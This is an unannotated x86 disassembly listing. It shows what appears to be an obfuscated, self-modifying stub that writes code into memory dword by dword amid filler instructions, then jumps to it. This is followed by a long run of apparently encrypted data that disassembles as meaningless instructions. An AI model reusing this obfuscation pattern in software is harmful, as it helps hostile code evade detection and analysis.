  403cf9:	23 f5                	and    %ebp,%esi
  403cfb:	66 03 e9             	add    %cx,%bp
  403cfe:	33 c0                	xor    %eax,%eax
  403d00:	b0 04                	mov    $0x4,%al
  403d02:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d06:	23 f5                	and    %ebp,%esi
  403d08:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403d0c:	81 09 4c 24 e0 81    	orl    $0x81e0244c,(%ecx)
  403d12:	66 03 e9             	add    %cx,%bp
  403d15:	33 c0                	xor    %eax,%eax
  403d17:	b0 04                	mov    $0x4,%al
  403d19:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d1d:	66 03 e9             	add    %cx,%bp
  403d20:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403d24:	68 01 07 47 4d       	push   $0x4d470701
  403d29:	8b f4                	mov    %esp,%esi
  403d2b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d2c:	58                   	pop    %eax
  403d2d:	66 03 e9             	add    %cx,%bp
  403d30:	33 c0                	xor    %eax,%eax
  403d32:	b0 04                	mov    $0x4,%al
  403d34:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d38:	66 03 e9             	add    %cx,%bp
  403d3b:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403d3f:	68 75 66 33 f1       	push   $0xf1336675
  403d44:	8b f4                	mov    %esp,%esi
  403d46:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d47:	58                   	pop    %eax
  403d48:	2b fd                	sub    %ebp,%edi
  403d4a:	66 23 d6             	and    %si,%dx
  403d4d:	33 c0                	xor    %eax,%eax
  403d4f:	b0 04                	mov    $0x4,%al
  403d51:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d55:	66 23 d6             	and    %si,%dx
  403d58:	66 03 e9             	add    %cx,%bp
  403d5b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403d5f:	81 08 33 c0 b0 04    	orl    $0x4b0c033,(%eax)
  403d65:	66 03 e9             	add    %cx,%bp
  403d68:	33 c0                	xor    %eax,%eax
  403d6a:	b0 04                	mov    $0x4,%al
  403d6c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d70:	66 03 e9             	add    %cx,%bp
  403d73:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403d77:	68 01 44 24 e0       	push   $0xe0244401
  403d7c:	8b f4                	mov    %esp,%esi
  403d7e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d7f:	58                   	pop    %eax
  403d80:	66 03 e9             	add    %cx,%bp
  403d83:	33 c0                	xor    %eax,%eax
  403d85:	b0 04                	mov    $0x4,%al
  403d87:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403d8b:	66 03 e9             	add    %cx,%bp
  403d8e:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403d92:	68 23 cd 66 03       	push   $0x366cd23
  403d97:	8b f4                	mov    %esp,%esi
  403d99:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403d9a:	58                   	pop    %eax
  403d9b:	66 2b c7             	sub    %di,%ax
  403d9e:	0f ac d8 03          	shrd   $0x3,%ebx,%eax
  403da2:	2b f0                	sub    %eax,%esi
  403da4:	33 c0                	xor    %eax,%eax
  403da6:	b0 04                	mov    $0x4,%al
  403da8:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403dac:	0f ac d8 03          	shrd   $0x3,%ebx,%eax
  403db0:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403db4:	81 00 f1 8b 4c 24    	addl   $0x244c8bf1,(%eax)
  403dba:	2b f0                	sub    %eax,%esi
  403dbc:	66 85 c3             	test   %ax,%bx
  403dbf:	33 c9                	xor    %ecx,%ecx
  403dc1:	b1 04                	mov    $0x4,%cl
  403dc3:	01 4c 24 e0          	add    %ecx,-0x20(%esp)
  403dc7:	66 85 c3             	test   %ax,%bx
  403dca:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403dce:	81 00 e0 81 01 ec    	addl   $0xec0181e0,(%eax)
  403dd4:	0f b6 c4             	movzbl %ah,%eax
  403dd7:	c1 d7 02             	rcl    $0x2,%edi
  403dda:	0b cb                	or     %ebx,%ecx
  403ddc:	33 c0                	xor    %eax,%eax
  403dde:	b0 04                	mov    $0x4,%al
  403de0:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403de4:	c1 d7 02             	rcl    $0x2,%edi
  403de7:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403deb:	81 08 81 c4 00 66    	orl    $0x6600c481,(%eax)
  403df1:	0b cb                	or     %ebx,%ecx
  403df3:	66 2b ed             	sub    %bp,%bp
  403df6:	33 d2                	xor    %edx,%edx
  403df8:	b2 04                	mov    $0x4,%dl
  403dfa:	01 54 24 e0          	add    %edx,-0x20(%esp)
  403dfe:	66 2b ed             	sub    %bp,%bp
  403e01:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403e05:	c7 00 03 f1 03 f9    	movl   $0xf903f103,(%eax)
  403e0b:	66 03 e9             	add    %cx,%bp
  403e0e:	33 c0                	xor    %eax,%eax
  403e10:	b0 04                	mov    $0x4,%al
  403e12:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403e16:	66 03 e9             	add    %cx,%bp
  403e19:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403e1d:	68 66 23 c5 33       	push   $0x33c52366
  403e22:	8b f4                	mov    %esp,%esi
  403e24:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e25:	58                   	pop    %eax
  403e26:	66 0b f9             	or     %cx,%di
  403e29:	03 c0                	add    %eax,%eax
  403e2b:	33 c0                	xor    %eax,%eax
  403e2d:	b0 04                	mov    $0x4,%al
  403e2f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403e33:	03 c0                	add    %eax,%eax
  403e35:	66 8b cd             	mov    %bp,%cx
  403e38:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403e3c:	81 00 d2 b2 04 01    	addl   $0x104b2d2,(%eax)
  403e42:	66 8b cd             	mov    %bp,%cx
  403e45:	0f c1 e8             	xadd   %ebp,%eax
  403e48:	66 03 e9             	add    %cx,%bp
  403e4b:	33 c0                	xor    %eax,%eax
  403e4d:	b0 04                	mov    $0x4,%al
  403e4f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403e53:	0f c1 e8             	xadd   %ebp,%eax
  403e56:	66 03 e9             	add    %cx,%bp
  403e59:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403e5d:	81 08 54 24 e0 03    	orl    $0x3e02454,(%eax)
  403e63:	66 03 e9             	add    %cx,%bp
  403e66:	33 c0                	xor    %eax,%eax
  403e68:	b0 04                	mov    $0x4,%al
  403e6a:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403e6e:	66 03 e9             	add    %cx,%bp
  403e71:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403e75:	68 f9 66 23 c5       	push   $0xc52366f9
  403e7a:	8b f4                	mov    %esp,%esi
  403e7c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403e7d:	58                   	pop    %eax
  403e7e:	33 d9                	xor    %ecx,%ebx
  403e80:	33 c0                	xor    %eax,%eax
  403e82:	b0 04                	mov    $0x4,%al
  403e84:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403e88:	66 2b f2             	sub    %dx,%si
  403e8b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403e8f:	81 08 8b 5c 24 e0    	orl    $0xe0245c8b,(%eax)
  403e95:	66 03 e9             	add    %cx,%bp
  403e98:	33 c0                	xor    %eax,%eax
  403e9a:	b0 04                	mov    $0x4,%al
  403e9c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403ea0:	66 03 e9             	add    %cx,%bp
  403ea3:	8b 7c 24 e0          	mov    -0x20(%esp),%edi
  403ea7:	68 81 03 02 00       	push   $0x20381
  403eac:	8b f4                	mov    %esp,%esi
  403eae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  403eaf:	58                   	pop    %eax
  403eb0:	33 d9                	xor    %ecx,%ebx
  403eb2:	33 c0                	xor    %eax,%eax
  403eb4:	b0 04                	mov    $0x4,%al
  403eb6:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403eba:	66 2b f2             	sub    %dx,%si
  403ebd:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403ec1:	81 08 00 61 66 23    	orl    $0x23666100,(%eax)
  403ec7:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  403ecc:	33 c0                	xor    %eax,%eax
  403ece:	b0 04                	mov    $0x4,%al
  403ed0:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403ed4:	03 df                	add    %edi,%ebx
  403ed6:	85 f6                	test   %esi,%esi
  403ed8:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403edc:	81 08 c5 33 c9 b1    	orl    $0xb1c933c5,(%eax)
  403ee2:	85 f6                	test   %esi,%esi
  403ee4:	23 f5                	and    %ebp,%esi
  403ee6:	66 8b c5             	mov    %bp,%ax
  403ee9:	33 c0                	xor    %eax,%eax
  403eeb:	b0 04                	mov    $0x4,%al
  403eed:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403ef1:	23 f5                	and    %ebp,%esi
  403ef3:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403ef7:	81 09 04 01 4c 24    	orl    $0x244c0104,(%ecx)
  403efd:	66 8b c5             	mov    %bp,%ax
  403f00:	33 c0                	xor    %eax,%eax
  403f02:	b0 04                	mov    $0x4,%al
  403f04:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f08:	0f be c7             	movsbl %bh,%eax
  403f0b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403f0f:	81 00 e0 0f b6 c7    	addl   $0xc7b60fe0,(%eax)
  403f15:	66 85 d5             	test   %dx,%bp
  403f18:	8d 53 02             	lea    0x2(%ebx),%edx
  403f1b:	33 c0                	xor    %eax,%eax
  403f1d:	b0 04                	mov    $0x4,%al
  403f1f:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f23:	8d 53 02             	lea    0x2(%ebx),%edx
  403f26:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  403f2a:	81 03 8b 5c 24 e0    	addl   $0xe0245c8b,(%ebx)
  403f30:	66 33 ea             	xor    %dx,%bp
  403f33:	33 c0                	xor    %eax,%eax
  403f35:	b0 04                	mov    $0x4,%al
  403f37:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f3b:	66 2b ed             	sub    %bp,%bp
  403f3e:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403f42:	c7 00 81 03 c3 55    	movl   $0x55c30381,(%eax)
  403f48:	66 23 cb             	and    %bx,%cx
  403f4b:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  403f4f:	33 c0                	xor    %eax,%eax
  403f51:	b0 04                	mov    $0x4,%al
  403f53:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f57:	0f a4 c0 03          	shld   $0x3,%eax,%eax
  403f5b:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403f5f:	81 00 8b ec 8b f0    	addl   $0xf08bec8b,(%eax)
  403f65:	03 d0                	add    %eax,%edx
  403f67:	8d 9f 6b de 40 00    	lea    0x40de6b(%edi),%ebx
  403f6d:	33 c0                	xor    %eax,%eax
  403f6f:	b0 04                	mov    $0x4,%al
  403f71:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f75:	8d 9f 6b de 40 00    	lea    0x40de6b(%edi),%ebx
  403f7b:	8b 5c 24 e0          	mov    -0x20(%esp),%ebx
  403f7f:	81 03 33 d2 b2 04    	addl   $0x4b2d233,(%ebx)
  403f85:	66 23 f1             	and    %cx,%si
  403f88:	33 c0                	xor    %eax,%eax
  403f8a:	b0 04                	mov    $0x4,%al
  403f8c:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403f90:	66 2b ed             	sub    %bp,%bp
  403f93:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403f97:	c7 00 01 54 24 e0    	movl   $0xe0245401,(%eax)
  403f9d:	81 f6 f8 fb 40 00    	xor    $0x40fbf8,%esi
  403fa3:	33 c0                	xor    %eax,%eax
  403fa5:	b0 04                	mov    $0x4,%al
  403fa7:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403fab:	66 03 d6             	add    %si,%dx
  403fae:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  403fb4:	8b 54 24 e0          	mov    -0x20(%esp),%edx
  403fb8:	81 0a 68 59 c4 40    	orl    $0x40c45968,(%edx)
  403fbe:	8d 9d ed da 40 00    	lea    0x40daed(%ebp),%ebx
  403fc4:	33 c0                	xor    %eax,%eax
  403fc6:	b0 04                	mov    $0x4,%al
  403fc8:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403fcc:	33 db                	xor    %ebx,%ebx
  403fce:	8b 44 24 e0          	mov    -0x20(%esp),%eax
  403fd2:	c7 00 00 c3 66 03    	movl   $0x366c300,(%eax)
  403fd8:	85 f6                	test   %esi,%esi
  403fda:	23 f5                	and    %ebp,%esi
  403fdc:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  403fe1:	33 c0                	xor    %eax,%eax
  403fe3:	b0 04                	mov    $0x4,%al
  403fe5:	01 44 24 e0          	add    %eax,-0x20(%esp)
  403fe9:	23 f5                	and    %ebp,%esi
  403feb:	8b 4c 24 e0          	mov    -0x20(%esp),%ecx
  403fef:	81 09 c6 00 00 00    	orl    $0xc6,(%ecx)
  403ff5:	bf 6a fe 40 00       	mov    $0x40fe6a,%edi
  403ffa:	33 c0                	xor    %eax,%eax
  403ffc:	b0 04                	mov    $0x4,%al
  403ffe:	01 44 24 e0          	add    %eax,-0x20(%esp)
  404002:	e9 52 b4 00 00       	jmp    0x40f459
  404007:	03 df                	add    %edi,%ebx
  404009:	23 cb                	and    %ebx,%ecx
  40400b:	66 2b ed             	sub    %bp,%bp
  40400e:	33 d9                	xor    %ecx,%ebx
  404010:	25 45 b2 de 94       	and    $0x94deb245,%eax
  404015:	db c9                	fcmovne %st(1),%st
  404017:	bc 7f 45 90 0c       	mov    $0xc90457f,%esp
  40401c:	08 f6                	or     %dh,%dh
  40401e:	3c d6                	cmp    $0xd6,%al
  404020:	40                   	inc    %eax
  404021:	96                   	xchg   %eax,%esi
  404022:	b6 32                	mov    $0x32,%dh
  404024:	59                   	pop    %ecx
  404025:	c3                   	ret
  404026:	8c 71 ce             	mov    %?,-0x32(%ecx)
  404029:	6a 5f                	push   $0x5f
  40402b:	f6 c4 65             	test   $0x65,%ah
  40402e:	c7                   	(bad)
  40402f:	3d e3 25 60 6a       	cmp    $0x6a6025e3,%eax
  404034:	54                   	push   %esp
  404035:	48                   	dec    %eax
  404036:	0f b6 03             	movzbl (%ebx),%eax
  404039:	ce                   	into
  40403a:	de 88 ad 85 d5 9c    	fimuls -0x632a7a53(%eax)
  404040:	5b                   	pop    %ebx
  404041:	b5 b0                	mov    $0xb0,%ch
  404043:	99                   	cltd
  404044:	73 cf                	jae    0x404015
  404046:	2d 78 86 91 9d       	sub    $0x9d918678,%eax
  40404b:	66 60                	pushaw
  40404d:	c7                   	(bad)
  40404e:	9c                   	pushf
  40404f:	6c                   	insb   (%dx),%es:(%edi)
  404050:	6d                   	insl   (%dx),%es:(%edi)
  404051:	bb e7 4b 9e 18       	mov    $0x189e4be7,%ebx
  404056:	16                   	push   %ss
  404057:	e8 a5 28 2d 8f       	call   0x8f6d6901
  40405c:	2d ea 14 a2 be       	sub    $0xbea214ea,%eax
  404061:	95                   	xchg   %eax,%ebp
  404062:	d7                   	xlat   %ds:(%ebx)
  404063:	62 7f c7             	bound  %edi,-0x39(%edi)
  404066:	71 af                	jno    0x404017
  404068:	9d                   	popf
  404069:	ce                   	into
  40406a:	9f                   	lahf
  40406b:	b6 b3                	mov    $0xb3,%dh
  40406d:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40406e:	64 07                	fs pop %es
  404070:	65 01 95 4b b3 ee 02 	add    %edx,%gs:0x2eeb34b(%ebp)
  404077:	da 08                	fimull (%eax)
  404079:	df d1                	(bad)
  40407b:	6e                   	outsb  %ds:(%esi),(%dx)
  40407c:	6b fc 4a             	imul   $0x4a,%esp,%edi
  40407f:	95                   	xchg   %eax,%ebp
  404080:	42                   	inc    %edx
  404081:	b0 ce                	mov    $0xce,%al
  404083:	5a                   	pop    %edx
  404084:	09 26                	or     %esp,(%esi)
  404086:	0e                   	push   %cs
  404087:	e1 b7                	loope  0x404040
  404089:	6d                   	insl   (%dx),%es:(%edi)
  40408a:	12 00                	adc    (%eax),%al
  40408c:	29 47 47             	sub    %eax,0x47(%edi)
  40408f:	b7 40                	mov    $0x40,%bh
  404091:	74 c0                	je     0x404053
  404093:	84 93 8c 40 a4 07    	test   %dl,0x7a4408c(%ebx)
  404099:	b9 f6 87 77 14       	mov    $0x147787f6,%ecx
  40409e:	0d 67 8e 81 ad       	or     $0xad818e67,%eax
  4040a3:	5e                   	pop    %esi
  4040a4:	1c eb                	sbb    $0xeb,%al
  4040a6:	cd 1d                	int    $0x1d
  4040a8:	91                   	xchg   %eax,%ecx
  4040a9:	34 f9                	xor    $0xf9,%al
  4040ab:	e3 19                	jecxz  0x4040c6
  4040ad:	c3                   	ret
  4040ae:	22 6b 34             	and    0x34(%ebx),%ch
  4040b1:	0c c7                	or     $0xc7,%al
  4040b3:	a0 8a 2e 46 a0       	mov    0xa0462e8a,%al
  4040b8:	cc                   	int3
  4040b9:	0d 15 7e 0c 4f       	or     $0x4f0c7e15,%eax
  4040be:	bf 89 c3 a3 0a       	mov    $0xaa3c389,%edi
  4040c3:	c8 48 37 93          	enter  $0x3748,$0x93
  4040c7:	fa                   	cli
  4040c8:	ac                   	lods   %ds:(%esi),%al
  4040c9:	13 39                	adc    (%ecx),%edi
  4040cb:	4a                   	dec    %edx
  4040cc:	b6 85                	mov    $0x85,%dh
  4040ce:	ea 92 17 bf 1f 9c c7 	ljmp   $0xc79c,$0x1fbf1792
  4040d5:	61                   	popa
  4040d6:	3b c2                	cmp    %edx,%eax
  4040d8:	b2 af                	mov    $0xaf,%dl
  4040da:	be 85 51 a8 9d       	mov    $0x9da85185,%esi
  4040df:	e8 75 9a 55 8b       	call   0x8b95db59
  4040e4:	89 fe                	mov    %edi,%esi
  4040e6:	47                   	inc    %edi
  4040e7:	42                   	inc    %edx
  4040e8:	6f                   	outsl  %ds:(%esi),(%dx)
  4040e9:	26 04 63             	es add $0x63,%al
  4040ec:	09 c5                	or     %eax,%ebp
  4040ee:	58                   	pop    %eax
  4040ef:	c0 e4 45             	shl    $0x45,%ah
  4040f2:	3b 9e a4 04 4b ce    	cmp    -0x31b4fb5c(%esi),%ebx
  4040f8:	83 2a 06             	subl   $0x6,(%edx)
  4040fb:	43                   	inc    %ebx
  4040fc:	56                   	push   %esi
  4040fd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4040fe:	80 f6 6f             	xor    $0x6f,%dh
  404101:	25 03 54 83 4a       	and    $0x4a835403,%eax
  404106:	e3 c1                	jecxz  0x4040c9
  404108:	e1 6a                	loope  0x404174
  40410a:	51                   	push   %ecx
  40410b:	fc                   	cld
  40410c:	c7                   	(bad)
  40410d:	2a d0                	sub    %al,%dl
  40410f:	08 41 2a             	or     %al,0x2a(%ecx)
  404112:	d5 28                	aad    $0x28
  404114:	58                   	pop    %eax
  404115:	30 c6                	xor    %al,%dh
  404117:	80 f4 72             	xor    $0x72,%ah
  40411a:	02 ce                	add    %dh,%cl
  40411c:	ff 68 48             	ljmp   *0x48(%eax)
  40411f:	10 97 16 e2 e0 7d    	adc    %dl,0x7de0e216(%edi)
  404125:	ef                   	out    %eax,(%dx)
  404126:	d5 4e                	aad    $0x4e
  404128:	ce                   	into
  404129:	25 50 41 da f2       	and    $0xf2da4150,%eax
  40412e:	0b 39                	or     (%ecx),%edi
  404130:	e1 18                	loope  0x40414a
  404132:	94                   	xchg   %eax,%esp
  404133:	be fb 31 6f 70       	mov    $0x706f31fb,%esi
  404138:	47                   	inc    %edi
  404139:	2e 67 be cb 06 63 d9 	cs addr16 mov $0xd96306cb,%esi
  404140:	da e7                	(bad)
  404142:	5b                   	pop    %ebx
  404143:	f4                   	hlt
  404144:	8d 29                	lea    (%ecx),%ebp
  404146:	4e                   	dec    %esi
  404147:	9f                   	lahf
  404148:	75 a4                	jne    0x4040ee
  40414a:	1c ee                	sbb    $0xee,%al
  40414c:	16                   	push   %ss
  40414d:	8d 6c 57 06          	lea    0x6(%edi,%edx,2),%ebp
  404151:	1e                   	push   %ds
  404152:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404153:	a1 03 6b 30 eb       	mov    0xeb306b03,%eax
  404158:	71 ab                	jno    0x404105
  40415a:	c9                   	leave
  40415b:	36 c3                	ss ret
  40415d:	3e bb 0c e6 ee 98    	ds mov $0x98eee60c,%ebx
  404163:	8a 88 b8 f2 90 25    	mov    0x2590f2b8(%eax),%cl
  404169:	06                   	push   %es
  40416a:	ca 87 6a             	lret   $0x6a87
  40416d:	91                   	xchg   %eax,%ecx
  40416e:	ad                   	lods   %ds:(%esi),%eax
  40416f:	d5 6d                	aad    $0x6d
  404171:	01 70 d0             	add    %esi,-0x30(%eax)
  404174:	db ec                	fucomi %st(4),%st
  404176:	02 b0 08 ad 20 a6    	add    -0x59df52f8(%eax),%dh
  40417c:	e2 b9                	loop   0x404137
  40417e:	b6 1e                	mov    $0x1e,%dh
  404180:	e9 38 54 e5 ef       	jmp    0xf02595bd
  404185:	6d                   	insl   (%dx),%es:(%edi)
  404186:	17                   	pop    %ss
  404187:	b1 9e                	mov    $0x9e,%cl
  404189:	20 97 08 2a 91 90    	and    %dl,-0x6f6ed5f8(%edi)
  40418f:	a8 7a                	test   $0x7a,%al
  404191:	15 47 41 ca 1e       	adc    $0x1eca4147,%eax
  404196:	de a5 7a e3 68 83    	fisubs -0x7c971c86(%ebp)
  40419c:	1c 6d                	sbb    $0x6d,%al
  40419e:	25 2e 85 c9 1f       	and    $0x1fc9852e,%eax
  4041a3:	4a                   	dec    %edx
  4041a4:	97                   	xchg   %eax,%edi
  4041a5:	ad                   	lods   %ds:(%esi),%eax
  4041a6:	c1 95 9a c3 8f 44 75 	rcll   $0x75,0x448fc39a(%ebp)
  4041ad:	aa                   	stos   %al,%es:(%edi)
  4041ae:	af                   	scas   %es:(%edi),%eax
  4041af:	91                   	xchg   %eax,%ecx
  4041b0:	34 0c                	xor    $0xc,%al
  4041b2:	4c                   	dec    %esp
  4041b3:	5e                   	pop    %esi
  4041b4:	13 d1                	adc    %ecx,%edx
  4041b6:	39 17                	cmp    %edx,(%edi)
  4041b8:	e3 f1                	jecxz  0x4041ab
  4041ba:	46                   	inc    %esi
  4041bb:	b8 6e 4d 54 5e       	mov    $0x5e544d6e,%eax
  4041c0:	3f                   	aas
  4041c1:	be 63 a3 7e 4a       	mov    $0x4a7ea363,%esi
  4041c6:	f4                   	hlt
  4041c7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4041c8:	ea 3a 4d 5b 42 79 d5 	ljmp   $0xd579,$0x425b4d3a
  4041cf:	62 74 41 17          	bound  %esi,0x17(%ecx,%eax,2)
  4041d3:	9f                   	lahf
  4041d4:	94                   	xchg   %eax,%esp
  4041d5:	8a b1 41 5d 88 1b    	mov    0x1b885d41(%ecx),%dh
  4041db:	92                   	xchg   %eax,%edx
  4041dc:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4041dd:	50                   	push   %eax
  4041de:	75 e5                	jne    0x4041c5
  4041e0:	f7 59 7d             	negl   0x7d(%ecx)
  4041e3:	1c cc                	sbb    $0xcc,%al
  4041e5:	82 ac 8d 5e 78 a4 df 	subb   $0x37,-0x205b87a2(%ebp,%ecx,4)
  4041ec:	37 
  4041ed:	32 0d b8 4e bb 2f    	xor    0x2fbb4eb8,%cl
  4041f3:	e2 15                	loop   0x40420a
  4041f5:	00 f4                	add    %dh,%ah
  4041f7:	96                   	xchg   %eax,%esi
  4041f8:	d0 a1 7b c0 10 21    	shlb   $1,0x2110c07b(%ecx)
  4041fe:	bf 3d 0c 9a ce       	mov    $0xce9a0c3d,%edi
  404203:	03 f8                	add    %eax,%edi
  404205:	8c dc                	mov    %ds,%esp
  404207:	36 8a 00             	mov    %ss:(%eax),%al
  40420a:	d9 6d 4c             	fldcw  0x4c(%ebp)
  40420d:	05 6d d4 48 75       	add    $0x7548d46d,%eax
  404212:	5d                   	pop    %ebp
  404213:	00 58 60             	add    %bl,0x60(%eax)
  404216:	4f                   	dec    %edi
  404217:	e9 73 a5 73 bf       	jmp    0xbfb3e78f
  40421c:	02 67 db             	add    -0x25(%edi),%ah
  40421f:	d5 ca                	aad    $0xca
  404221:	95                   	xchg   %eax,%ebp
  404222:	37                   	aaa
  404223:	26 8b e1             	es mov %ecx,%esp
  404226:	97                   	xchg   %eax,%edi
  404227:	70 45                	jo     0x40426e
  404229:	2a d3                	sub    %bl,%dl
  40422b:	78 d5                	js     0x404202
  40422d:	5c                   	pop    %esp
  40422e:	4c                   	dec    %esp
  40422f:	3d 68 dd 83 35       	cmp    $0x3583dd68,%eax
  404234:	b7 3f                	mov    $0x3f,%bh
  404236:	ef                   	out    %eax,(%dx)
  404237:	58                   	pop    %eax
  404238:	e7 a5                	out    %eax,$0xa5
  40423a:	4c                   	dec    %esp
  40423b:	98                   	cwtl
  40423c:	fd                   	std
  40423d:	7a 29                	jp     0x404268
  40423f:	25 50 b7 c8 ba       	and    $0xbac8b750,%eax
  404244:	89 41 97             	mov    %eax,-0x69(%ecx)
  404247:	94                   	xchg   %eax,%esp
  404248:	41                   	inc    %ecx
  404249:	ad                   	lods   %ds:(%esi),%eax
  40424a:	9d                   	popf
  40424b:	7d 3e                	jge    0x40428b
  40424d:	01 ab 43 86 90 21    	add    %ebp,0x21908643(%ebx)
  404253:	e4 7a                	in     $0x7a,%al
  404255:	fb                   	sti
  404256:	75 b4                	jne    0x40420c
  404258:	28 e1                	sub    %ah,%cl
  40425a:	66 c6 c1 30          	data16 mov $0x30,%cl
  40425e:	35 0e 30 18 88       	xor    $0x8818300e,%eax
  404263:	dd ab 3d fa e2 35    	(bad) 0x35e2fa3d(%ebx)
  404269:	f8                   	clc
  40426a:	02 d0                	add    %al,%dl
  40426c:	bf b3 6c 9c a4       	mov    $0xa49c6cb3,%edi
  404271:	c0 14 76 0c          	rclb   $0xc,(%esi,%esi,2)
  404275:	49                   	dec    %ecx
  404276:	89 78 8b             	mov    %edi,-0x75(%eax)
  404279:	c1 87 71 46 e2 e8 41 	roll   $0x41,-0x171db98f(%edi)
  404280:	75 71                	jne    0x4042f3
  404282:	b4 66                	mov    $0x66,%ah
  404284:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  404285:	35 64 e7 cd ab       	xor    $0xabcde764,%eax
  40428a:	ea 05 29 ee ac a7 9e 	ljmp   $0x9ea7,$0xacee2905
  404291:	37                   	aaa
  404292:	17                   	pop    %ss
  404293:	e9 36 26 05 c8       	jmp    0xc84568ce
  404298:	f9                   	stc
  404299:	59                   	pop    %ecx
  40429a:	21 04 a0             	and    %eax,(%eax,%eiz,4)
  40429d:	fa                   	cli
  40429e:	5d                   	pop    %ebp
  40429f:	2d 50 c3 92 aa       	sub    $0xaa92c350,%eax
  4042a4:	1c f7                	sbb    $0xf7,%al
  4042a6:	e1 1d                	loope  0x4042c5
  4042a8:	1a 28                	sbb    (%eax),%ch
  4042aa:	be 56 c2 1f e7       	mov    $0xe71fc256,%esi
  4042af:	6a c1                	push   $0xffffffc1
  4042b1:	3f                   	aas
  4042b2:	b3 21                	mov    $0x21,%bl
  4042b4:	45                   	inc    %ebp
  4042b5:	ed                   	in     (%dx),%eax
  4042b6:	95                   	xchg   %eax,%ebp
  4042b7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4042b8:	46                   	inc    %esi
  4042b9:	79 7a                	jns    0x404335
  4042bb:	bf d3 42 bc 8e       	mov    $0x8ebc42d3,%edi
  4042c0:	5f                   	pop    %edi
  4042c1:	01 a4 b4 93 76 0a 92 	add    %esp,-0x6df5896d(%esp,%esi,4)
  4042c8:	62 b1 e2 15 93 1c    	bound  %esi,0x1c9315e2(%ecx)
  4042ce:	14 62                	adc    $0x62,%al
  4042d0:	b4 9f                	mov    $0x9f,%ah
  4042d2:	45                   	inc    %ebp
  4042d3:	80 c4 43             	add    $0x43,%ah
  4042d6:	c5 36                	lds    (%esi),%esi
  4042d8:	c6                   	(bad)
  4042d9:	d9 8f 91 26 63 b5    	(bad) -0x4a9cd96f(%edi)
  4042df:	ba 2a c7 0e 6a       	mov    $0x6a0ec72a,%edx
  4042e4:	cd 5a                	int    $0x5a
  4042e6:	43                   	inc    %ebx
  4042e7:	c9                   	leave
  4042e8:	01 02                	add    %eax,(%edx)
  4042ea:	72 52                	jb     0x40433e
  4042ec:	d1 32                	shll   $1,(%edx)
  4042ee:	86 6c 3f 34          	xchg   %ch,0x34(%edi,%edi,1)
  4042f2:	40                   	inc    %eax
  4042f3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4042f4:	d9 3f                	fnstcw (%edi)
  4042f6:	2e 64 a7             	cs cmpsl %es:(%edi),%fs:(%esi)
  4042f9:	2a 06                	sub    (%esi),%al
  4042fb:	c8 13 d3 ca          	enter  $0xd313,$0xca
  4042ff:	b6 33                	mov    $0x33,%dh
  404301:	25 37 58 a4 84       	and    $0x84a45837,%eax
  404306:	67 1a 29             	sbb    (%bx,%di),%ch
  404309:	c3                   	ret
  40430a:	68 90 77 35 88       	push   $0x88357790
  40430f:	ec                   	in     (%dx),%al
